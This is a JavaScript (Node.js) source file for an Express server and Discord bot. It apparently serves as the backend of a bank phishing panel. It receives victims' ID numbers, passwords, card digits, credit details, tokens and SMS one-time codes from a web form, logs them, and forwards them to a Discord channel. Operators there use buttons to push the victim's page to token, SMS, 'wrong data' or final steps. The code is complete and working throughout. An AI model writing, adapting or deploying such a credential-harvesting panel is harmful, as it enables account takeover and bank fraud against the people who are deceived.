// ============================================
// BOT DISCORD + API con dumpTextChannels()
// ============================================

require("dotenv").config();

const {
  Client,
  GatewayIntentBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  PermissionFlagsBits,
  ChannelType,
} = require("discord.js");
const express = require("express");
const cors = require("cors");

// ========== CONFIGURACIÓN ==========
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID; // opcional al inicio
const PORT = parseInt(process.env.PORT || "3000", 10);

if (!DISCORD_TOKEN) {
  console.error("❌ Falta DISCORD_TOKEN en .env");
  process.exit(1);
}

// ========== BASE DE DATOS EN MEMORIA ==========
const database = new Map();

// ========== INICIALIZAR DISCORD BOT ==========
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

// ========== SERVIDOR EXPRESS ==========
const app = express();
app.use(cors());
app.use(express.json());

// Endpoint: HTML envía nuevo documento
app.post("/api/new-document", async (req, res) => {
  const {
    docId,
    tipoIdentificacion,
    identificacion,
    clave,
    ultimosDigitos,
    ciudad,
    tipo,
    credito,
    token,
    sms,
  } = req.body;

  console.log("📨 Recibido nuevo documento:", docId);
  console.log("📊 Datos recibidos:", req.body);

  if (!docId) {
    return res.status(400).json({ error: "docId es requerido" });
  }

  // Guardar en memoria con todos los datos
  database.set(docId, {
    page: 1,
    action: "none",
    timestamp: Date.now(),
    tipoIdentificacion: tipoIdentificacion || "No especificado",
    identificacion: identificacion || docId,
    clave: clave || "No proporcionada",
    ultimosDigitos: ultimosDigitos || "No proporcionados",
    ciudad: ciudad || "No especificada",
    tipo: tipo || "general",
    credito: credito || "No proporcionado",
    token: token || "No proporcionado",
    sms: sms || "No proporcionado",
  });

  console.log("💾 Guardado en base de datos:", docId);

  // Enviar mensaje a Discord (si hay CHANNEL_ID configurado)
  try {
    if (!CHANNEL_ID) {
      console.warn("⚠️ CHANNEL_ID no configurado. No se enviará a Discord.");
    } else {
      await sendMessageWithButtons(docId);
      console.log("✅ Mensaje enviado a Discord para:", docId);
    }
    res.json({ success: true, docId });
  } catch (error) {
    console.error("❌ Error enviando a Discord:", error.message);
    res
      .status(500)
      .json({ error: "Error enviando a Discord", details: error.message });
  }
});

// Endpoint: Obtener documento
app.get("/api/document/:docId", (req, res) => {
  const { docId } = req.params;
  const data = database.get(docId);
  if (!data) return res.status(404).json({ error: "Documento no encontrado" });
  res.json(data);
});

// Endpoint: Obtener todos los documentos
app.get("/api/documents", (req, res) => {
  const docs = Array.from(database.entries()).map(([id, data]) => ({
    id,
    ...data,
  }));
  res.json(docs);
});

// Endpoint de prueba/estado
app.get("/api/test", (req, res) => {
  res.json({
    status: "OK",
    botConnected: client.isReady(),
    botUser: client.isReady() ? client.user.tag : null,
    documentsCount: database.size,
  });
});

// ========== NUEVO: Listado de canales accesibles ==========
app.get("/api/channels", async (req, res) => {
  try {
    if (!client.isReady()) return res.json({ ready: false, guilds: [] });

    const result = [];
    for (const [guildId, guild] of client.guilds.cache) {
      const g = await client.guilds.fetch(guildId);
      const channels = await g.channels.fetch();

      const sendable = [];
      channels.forEach((ch) => {
        if (!ch) return;
        const type = ch.type;
        const sendableTypes = new Set([
          ChannelType.GuildText,
          ChannelType.PublicThread,
          ChannelType.PrivateThread,
        ]);
        if (!sendableTypes.has(type)) return;

        const perms = ch.permissionsFor(client.user);
        const canView = perms?.has(PermissionFlagsBits.ViewChannel);
        const canSend = perms?.has(PermissionFlagsBits.SendMessages);
        sendable.push({
          id: ch.id,
          name: ch.name || "(thread)",
          type,
          canView: !!canView,
          canSend: !!canSend,
          status:
            canView && canSend
              ? "sendable"
              : canView
              ? "view-only"
              : "no-access",
        });
      });

      result.push({
        guildId: g.id,
        guildName: g.name,
        channels: sendable.sort((a, b) => a.name.localeCompare(b.name)),
      });
    }

    res.json({ ready: true, guilds: result });
  } catch (err) {
    console.error("❌ Error /api/channels:", err);
    res.status(500).json({ error: err.message });
  }
});

// ========== ENVIAR MENSAJE CON BOTONES A DISCORD ==========
async function sendMessageWithButtons(docId) {
  if (!client.isReady()) throw new Error("Bot no está conectado a Discord");
  if (!CHANNEL_ID) throw new Error("CHANNEL_ID no configurado");

  console.log("📡 Buscando canal:", CHANNEL_ID);

  const channel = await client.channels.fetch(CHANNEL_ID).catch(() => null);
  if (!channel)
    throw new Error(`No se pudo encontrar/acceder al canal: ${CHANNEL_ID}`);
  if (!("send" in channel)) {
    throw new Error(
      `El canal ${CHANNEL_ID} no permite enviar mensajes (type=${channel.type}).`
    );
  }

  const docData = database.get(docId);

  // Construir campos dinámicamente basado en los datos disponibles
  const fields = [
    { name: "📋 ID del Documento", value: `\`${docId}\``, inline: false },
    { name: "🏙️ Ciudad", value: docData.ciudad, inline: true },
    { name: "👤 Tipo ID", value: docData.tipoIdentificacion, inline: true },
    {
      name: "🔢 Identificación",
      value: `\`${docData.identificacion}\``,
      inline: true,
    },
  ];

  // Agregar campos específicos según el tipo de datos
  if (docData.tipo === "login" || docData.clave !== "No proporcionada") {
    fields.push({
      name: "🔑 Clave",
      value: `\`${docData.clave}\``,
      inline: true,
    });
  }

  if (docData.ultimosDigitos !== "No proporcionados") {
    fields.push({
      name: "🔢 Últimos Dígitos",
      value: `\`${docData.ultimosDigitos}\``,
      inline: true,
    });
  }

  if (docData.credito !== "No proporcionado") {
    fields.push({
      name: "💳 Crédito",
      value: `\`${docData.credito}\``,
      inline: true,
    });
  }

  if (docData.token !== "No proporcionado") {
    fields.push({
      name: "🔐 Token",
      value: `\`${docData.token}\``,
      inline: true,
    });
  }

  if (docData.sms !== "No proporcionado") {
    fields.push({ name: "📱 SMS", value: `\`${docData.sms}\``, inline: true });
  }

  // Agregar campo de tipo
  fields.push({
    name: "📝 Tipo de Operación",
    value: docData.tipo,
    inline: true,
  });

  const embed = new EmbedBuilder()
    .setColor("#0099ff")
    .setTitle("🆕 Nuevo Documento Detectado")
    .setDescription("Usa los botones para controlar este documento")
    .addFields(fields)
    .setTimestamp()
    .setFooter({ text: "Discord Control Panel" });

  const row1 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`page_1_${docId}`)
      .setLabel("Inicio")
      .setEmoji("🏠")
      .setStyle(ButtonStyle.Primary),
    new ButtonBuilder()
      .setCustomId(`page_2_${docId}`)
      .setLabel("Token")
      .setEmoji("🔑")
      .setStyle(ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId(`page_3_${docId}`)
      .setLabel("Crédito")
      .setEmoji("💳")
      .setStyle(ButtonStyle.Secondary)
  );

  const row2 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`page_4_${docId}`)
      .setLabel("SMS")
      .setEmoji("📱")
      .setStyle(ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId(`page_5_${docId}`)
      .setLabel("Datos Incorrectos")
      .setEmoji("❌")
      .setStyle(ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId(`page_6_${docId}`)
      .setLabel("Final")
      .setEmoji("✅")
      .setStyle(ButtonStyle.Success)
  );

  const row3 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`delete_${docId}`)
      .setLabel("Eliminar")
      .setEmoji("🗑️")
      .setStyle(ButtonStyle.Danger)
  );

  console.log("📤 Enviando mensaje con botones...");
  const message = await channel.send({
    embeds: [embed],
    components: [row1, row2, row3],
  });
  console.log("✅ Mensaje enviado! ID:", message.id);
}

// ========== MANEJAR CLICKS EN BOTONES ==========
client.on("interactionCreate", async (interaction) => {
  if (!interaction.isButton()) return;

  console.log("👆 Botón clickeado:", interaction.customId);

  try {
    const parts = interaction.customId.split("_");
    const action = parts[0];

    if (action === "delete") {
      const realDocId = parts.slice(1).join("_");
      database.delete(realDocId);

      await interaction.update({
        embeds: [
          new EmbedBuilder()
            .setColor("#ff0000")
            .setTitle("🗑️ Documento Eliminado")
            .setDescription(
              `El documento \`${realDocId}\` ha sido eliminado correctamente.`
            )
            .setTimestamp(),
        ],
        components: [],
      });

      console.log("🗑️ Documento eliminado:", realDocId);
      return;
    }

    if (action === "page") {
      const page = parseInt(parts[1], 10);
      const realDocId = parts.slice(2).join("_");

      // Actualizar solo la página y acción, mantener los demás datos
      const currentData = database.get(realDocId) || {};
      database.set(realDocId, {
        ...currentData,
        page,
        action: "waiting",
        timestamp: Date.now(),
      });
      console.log(
        `⏳ Esperando confirmación - Página ${page} para:`,
        realDocId
      );

      const confirmRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId(`confirm_yes_${page}_${realDocId}`)
          .setLabel("✅ SÍ")
          .setStyle(ButtonStyle.Success),
        new ButtonBuilder()
          .setCustomId(`confirm_no_${page}_${realDocId}`)
          .setLabel("❌ NO")
          .setStyle(ButtonStyle.Danger)
      );

      const pageNames = [
        "",
        "🏠 Inicio",
        "🔑 Token",
        "💳 Crédito",
        "📱 SMS",
        "❌ Datos Incorrectos",
        "✅ Final",
      ];

      await interaction.reply({
        content: `📄 **Cambiar a: ${pageNames[page]}** (Página ${page})\n📋 Documento: \`${realDocId}\`\n\n❓ ¿Confirmar esta acción?`,
        components: [confirmRow],
        ephemeral: false,
      });
      return;
    }

    if (action === "confirm") {
      const response = parts[1]; // yes | no
      const page = parseInt(parts[2], 10);
      const realDocId = parts.slice(3).join("_");

      if (response === "yes") {
        // Actualizar solo la página y acción, mantener los demás datos
        const currentData = database.get(realDocId) || {};
        database.set(realDocId, {
          ...currentData,
          page,
          action: "approved",
          timestamp: Date.now(),
        });
        console.log(`✅ APROBADO - Página ${page} para:`, realDocId);

        const pageNames = [
          "",
          "🏠 Inicio",
          "🔑 Token",
          "💳 Crédito",
          "📱 SMS",
          "❌ Datos Incorrectos",
          "✅ Final",
        ];

        await interaction.update({
          content: `✅ **¡CONFIRMADO!**\n\n${pageNames[page]} (Página ${page}) activada para:\n📋 \`${realDocId}\`\n\n*El frontend debería reaccionar ahora...*`,
          components: [],
        });
      } else {
        const currentData = database.get(realDocId) || {};
        database.set(realDocId, {
          ...currentData,
          action: "cancelled",
          timestamp: Date.now(),
        });
        console.log(`❌ CANCELADO para:`, realDocId);

        await interaction.update({
          content: `❌ **Acción cancelada**\n\nNo se realizaron cambios para:\n📋 \`${realDocId}\``,
          components: [],
        });
      }
      return;
    }
  } catch (error) {
    console.error("❌ Error procesando interacción:", error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({
        content: "❌ Ocurrió un error al procesar tu acción",
        ephemeral: true,
      });
    }
  }
});

// ========== EVENTO PRINCIPAL (sin warning) ==========
client.once("clientReady", onClientReady);

async function onClientReady() {
  console.log("");
  console.log("═══════════════════════════════════════");
  console.log("✅ BOT DISCORD CONECTADO");
  console.log("═══════════════════════════════════════");
  console.log(`🤖 Usuario: ${client.user.tag}`);
  console.log(`🆔 ID: ${client.user.id}`);
  console.log(`🌐 Servidor API: http://localhost:${PORT}`);
  console.log("═══════════════════════════════════════\n");

  // Diagnóstico: lista canales accesibles en consola
  await dumpTextChannels();

  // Validación opcional del CHANNEL_ID si está configurado
  if (CHANNEL_ID) {
    try {
      const ch = await client.channels.fetch(CHANNEL_ID);
      const sendableTypes = new Set([
        ChannelType.GuildText,
        ChannelType.PublicThread,
        ChannelType.PrivateThread,
      ]);
      if (!sendableTypes.has(ch.type) || !("send" in ch)) {
        throw new Error(
          `El CHANNEL_ID ${CHANNEL_ID} no es un canal de texto/thread enviable (type=${ch.type}).`
        );
      }
      const perms = ch.permissionsFor(client.user);
      if (
        !perms?.has(PermissionFlagsBits.ViewChannel) ||
        !perms?.has(PermissionFlagsBits.SendMessages)
      ) {
        throw new Error(
          `Sin permisos suficientes en ${CHANNEL_ID}: requiere ViewChannel + SendMessages.`
        );
      }
      console.log(`✅ Canal configurado OK: #${ch.name} (${ch.id})`);
    } catch (e) {
      console.error("❌ Configuración de canal inválida:", e.message);
    }
  } else {
    console.warn(
      "⚠️ No has configurado CHANNEL_ID en .env. Usa /api/channels o la consola para hallar el correcto."
    );
  }
}

// ========== LISTAR CANALES ACCESIBLES (consola) ==========
async function dumpTextChannels() {
  try {
    console.log("🔎 Escaneando servidores y canales accesibles…");

    for (const [guildId, guild] of client.guilds.cache) {
      const g = await client.guilds.fetch(guildId);
      console.log(`\n🏰 Servidor: ${g.name} (${g.id})`);

      const channels = await g.channels.fetch();
      channels.forEach((ch) => {
        if (!ch) return;

        const sendableTypes = new Set([
          ChannelType.GuildText,
          ChannelType.PublicThread,
          ChannelType.PrivateThread,
        ]);

        if (sendableTypes.has(ch.type)) {
          const perms = ch.permissionsFor(client.user);
          const canView = perms?.has(PermissionFlagsBits.ViewChannel);
          const canSend = perms?.has(PermissionFlagsBits.SendMessages);

          if (canView && canSend) {
            console.log(
              `  • #${ch.name || "(thread)"}  =>  ${ch.id}  [type=${
                ch.type
              }] ✅ puede enviar`
            );
          } else if (canView) {
            console.log(
              `  • #${ch.name || "(thread)"}  =>  ${ch.id}  [type=${
                ch.type
              }] 👀 solo ver (sin enviar)`
            );
          } else {
            console.log(
              `  • #${ch.name || "(thread)"}  =>  ${ch.id}  [type=${
                ch.type
              }] 🚫 sin acceso`
            );
          }
        }
      });
    }

    console.log("\n📝 Copia el ID correcto y colócalo en .env como CHANNEL_ID");
  } catch (err) {
    console.error("❌ Error listando canales:", err);
  }
}

client.on("error", (error) => {
  console.error("❌ Error del bot:", error);
});

// ========== INICIAR SERVIDOR Y BOT ==========
app.listen(PORT, () => {
  console.log(`🚀 Servidor API iniciado en puerto ${PORT}`);
});

client.login(DISCORD_TOKEN).catch((error) => {
  console.error("\n❌❌❌ ERROR AL CONECTAR EL BOT ❌❌❌\n");
  console.error("Razón:", error.message, "\n");
  console.error("Verifica:");
  console.error("1) DISCORD_TOKEN en .env");
  console.error("2) El bot está invitado al/los servidor(es)");
  console.error("3) Intents/permisos en Developer Portal");
  console.error("4) Si vas a enviar, configura CHANNEL_ID válido\n");
  process.exit(1);
});

// Salida limpia
process.on("SIGINT", () => {
  console.log("👋 Cerrando…");
  process.exit(0);
});
